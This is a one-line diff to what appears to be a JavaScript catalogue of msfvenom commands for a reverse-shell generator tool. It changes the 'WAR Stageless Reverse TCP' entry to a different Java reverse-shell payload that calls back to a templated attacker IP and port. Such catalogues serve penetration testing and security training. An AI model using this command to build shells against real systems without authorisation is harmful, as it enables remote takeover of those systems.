@@ -420,7 +420,7 @@ const msfvenomCommands =  withCommandType(
         },
         {
             "name": "WAR Stageless Reverse TCP",
-            "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war",
+            "command": "msfvenom -p java/shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war",
             "meta": ["msfvenom", "windows", "linux", "stageless", "reverse"]
         },
         {
